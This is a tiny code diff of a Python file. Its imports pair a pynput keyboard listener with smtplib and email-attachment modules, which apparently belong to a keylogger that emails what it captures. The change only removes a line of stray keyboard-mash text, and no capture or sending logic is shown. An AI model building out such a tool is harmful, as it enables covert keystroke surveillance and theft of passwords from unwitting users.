@@ -2,7 +2,7 @@ from datetime import datetime
 from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import os
-i8kl;koyifuujhvulho0v;t9idxikjtvil9         
+
 from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
